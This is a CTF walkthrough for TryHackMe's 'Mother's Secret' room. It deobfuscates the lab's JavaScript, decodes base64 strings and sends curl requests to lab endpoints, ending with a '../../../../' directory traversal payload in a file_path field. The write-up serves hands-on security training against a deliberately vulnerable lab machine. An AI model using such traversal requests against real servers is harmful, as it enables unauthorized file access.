# Mother's Secret Walkthrough
<br/>

## Intro
Welcome to teh Mother's Secret challenge, here is teh link to the [room]() on TryHackMe.

In this challenge, you will investigate the TryHackMe Cargo Star Ship (THMCSS) Nostromo, owned by the Weyland-TryHackMe Corps and its compromised computer system, MU-TH-UR 6000. Your mission is to uncover hidden secrets by exploiting vulnerabilities in the web application running on the Nostromo server. Get ready to put your code analysis and exploitation skills to the test!

Upon accessing the MU-TH-UR6000 computer, AKA Mother, you will see the Mother UI server. However, since you only have a "Crew" Member level role, you only have read access to limited resources. But there are other ways to access it. Can you find them and uncover Mother's secret?

**Operating Manual**
﻿Below are some sequences and operations to get you started. Use the following to unlock information and navigate Mother:  
- Emergency command override is 100375. Use it when accessing _Alien Loaders_. 
- Download the task files to learn about Mother's routes.
- Hitting the _routes_ in the _right_ order makes Mother confused, it might think you are a Science Officer!


Whenever you feel ready press on "start the machine" and prepare your setup using either the AttackBox or your own machine connected via OpenVPN.

<br/>
<br/>

## The Challenge
The first thing we have to do is downloading the file attachments on our machine.
Then we can visit the hosted website with our browser at:
```
http://MACHINE_IP
```

Here we are presented with a panel containing some information about the challenge and our role: "crew member".
Now we can begin the search for the secret flag.

Viewing the page source we can identify a JavaScript document being called, but it is obfuscated, we can use an online JS deobfuscator and beautifier to read the content.
You will also need to decode some hex-strings and you will have this code:

```javascript
let authYaml = false;
let authNostromo = false;
const yamlSocket = io("/yaml");
const nostromoSocket = io("/nostromo");
const authWebSocket = () => {
  yamlSocket.on("connect", () => {
    console.log("Connected to /yaml route");
  });
  yamlSocket.on("yaml", chermaine => {
    authYaml = true;
    if (authNostromo && authYaml) {
      modifyData();
    }
  });
  yamlSocket.on("disconnect", () => {
    console.log("Disconnected from /yaml route");
  });
  nostromoSocket.on("connect", () => {
    console.log("Connected to /nostromo route");
  });
  nostromoSocket.on("nostromo", demeisha => {
    authNostromo = true;
    if (authNostromo && authYaml) {
      modifyData();
    }
  });
  nostromoSocket.on("disconnect", () => {
    console.log("Disconnected from /nostromo route");
  });
};
authWebSocket();
const modifyData = () => {
  contentx[2] = "Ash";
  contentx[3] = atob("VEhNX0ZMQUd7MFJEM1JfOTM3fQ==");
  document.querySelector(".crew-member").innerHTML = "Ash";
};
(() => {
  const jurany = document.querySelector(".dots-container");
  const leyiah = [];
  for (let tadan = 0; tadan < 32; tadan++) {
    let elaena = "";
    for (let locklynn = 0; locklynn < 42; locklynn++) {
      elaena += '<p class="custom-dots__dots"></p>';
    }
    if (tadan === 5) {
      leyiah.push('\n <div class="special-grid">\n  <div\n  class="w-full] rounded-lg flex items-center z-20 p-3 pb-0  shadow-lg flex-1"\n  >\n  <div class="flex flex-col w-[30%] justify-between h-full mr-[50px] text-center">\n    <div\n      class="p-4 theme-green rounded-lg relative button-box"\n      id="top"\n    > \n    <div class="absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center">\n      <p class="theme-line w-[51px]"></p>\n    </div>\n    Alien Loader\n    </div>\n    <div\n      class="p-4 theme-green rounded-lg relative button-box"\n      id="bottom"\n    > Pathways </div>\n    <div\n      class="p-4 theme-green rounded-lg relative button-box"\n      id="left"\n    > Role </div>\n    <div\n      class="p-4 theme-green rounded-lg relative button-box"\n      id="right"\n    > Flag </div>\n  </div>\n  <div class="flex justify-center flex-1 h-[20rem] overflow-y-auto descr-box 	 overflow-x-hidden theme-green">\n    <div\n      class=" rounded-lg py-2 px-4  flex gap-4 items-center justify-center mr-1"\n    >\n      <div class="content-placeholder">\n        <p>\n          Embedded within the intricate codes of Mother\'s system lies the Alien Loader, a peculiar\n          YAML loader function. This function parses and loads YAML data. Be cautious, as this\n          loader holds the truths to unveil the hidden paths.\n        </p>\n      </div>\n    </div>\n  </div>\n  </div>\n  <div class="flex w-full mx-auto items-center z-20 gap-2 pl-2 shadow-lg theme-color" >\n    <p class="text-lg">Use</p>\n    <b class="text-xl">UP</b>\n    <p class="text-lg">and</p>\n    <b class="text-xl">DOWN</b>\n    <p class="text-lg">keys to move.</p>\n  </div>\n</div>\n  ');
    }
    leyiah.push('<div class="custom-dots">' + elaena + "</div>");
  }
  jurany.insertAdjacentHTML("afterbegin", leyiah.join(""));
})();
const allBoxes = document.querySelectorAll(".button-box");
const removeArrow = () => {
  allBoxes.forEach(ener => {
    ener.innerHTML = "";
  });
};
const boxes = ["Alien Loader", "Pathways", "Role", "Flag"];
let contentx = ["Embedded within the intricate codes of Mother's system lies the Alien Loader, a peculiar YAML loader function. This function parses and loads YAML data. Be cautious, as this loader holds the truths to unveil the hidden paths.", "[!]CAUTION[!] The Nostromo holds countless winding corridors and concealed chambers, harboring secrets that lie beyond the intended boundaries. Embrace the power of relative file paths within MOTHER, to uncover SECRETS and traverse the labyrinthine structure of the ship and reach your desired destinations.", "Crew Member", atob("Q0xBU1NJRklFRA==")];
const addArrow = shelbyjean => {
  const mikailyn = document.querySelector(".content-placeholder");
  allBoxes.forEach((bryant, kerron) => {
    bryant.innerHTML = boxes[kerron];
    if (shelbyjean == kerron) {
      bryant.insertAdjacentHTML("afterbegin", '\n<div class="absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center">\n<p class="theme-line w-[51px]"></p>\n</div>\n');
      mikailyn.innerHTML = "";
      mikailyn.insertAdjacentHTML("afterbegin", "<p>" + contentx[value] + "</p>");
    }
  });
};
let value = 0;
document.addEventListener("keydown", function (drene) {
  var evaney = drene.keyCode || drene.which;
  switch (evaney) {
    case 38:
      value = value - 1;
      if (value < 0) {
        value = 0;
      }
      removeArrow();
      addArrow(value);
      break;
    case 40:
      value = value + 1;
      if (value > 3) {
        value = 3;
      }
      removeArrow();
      addArrow(value);
      break;
    default:
      return;
  }
});

```


Inside the code we can also spot some interesting base64 encoded strings, let's decode them:
```bash
echo "VEhNX0ZMQUd7MFJEM1JfOTM3fQ==" | base64 -d
```
-> ==THM_FLAG{REDACTED}== 

and 
```bash
echo "Q0xBU1NJRklFRA==" | base64 -d
```
-->  ==CLASSIFIED==

Looking at the downloaded file we can also understand that to access /nostromo/mother we need to visit first the /yaml and /nostromo endpoints.
So i crafted a request containing the oversside code using cURL (you can do the same with Burp Suite):
```bash
curl -X POST http://MACHINE_IP/yaml/ -H "Content-Type: application/json" --data '{"file_path":"100375.yaml"}' 
```

And i received the message:
```
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3r937.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT. 
```

Now we know that the code order is REDACTED

Now we can send a request to the /api/nostromo endpoint to retreive the order file:
```bash
curl -X POST http://MACHINE_IP/api/nostromo/ -H "Content-Type: application/json" --data '{"file_path":"0rd3r937.txt"}'
```

```
 Mother
FOR SCIENCE OFFICER EYES ONLY 
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{REDACTED}

```

Now that we have visited the 2 endpoints we can go to /nostromo/mother and ask for the secret file:
```bash
curl -X POST http://MACHINE_IP/api/nostromo/mother/ -H "Content-Type: application/json" --data '{"file_path":"secret.txt"}'
```

And we get the response "Secret: REDACTED "

Sending a request like throws us an error.
```bash
curl -X POST http://MACHINE_IP/api/nostromo/mother/REDACTED -H "Content-Type: application/json" --data '{"file_path":"REDACTED"}'
```

The possible explanation is that is that the "/" directory is set as the current website root directory, meaning that we need to escape it doing directory traversal to reach the real root directory and that move to the flag.
```bash
curl -X POST http://MACHINE_IP/api/nostromo/mother/ -H "Content-Type: application/json" --data '{"file_path":"../../../../REDACTED"}'
```

It worked: 
```
Classified information.

Secret: REDACTED
```

<br/>
<br/>

Congratulations you have successfully uncovered the Mother's Secret adn practiced your decoding and API interaction skills.
Hope you had fun following along.

Catch you in the next CTF 😃 
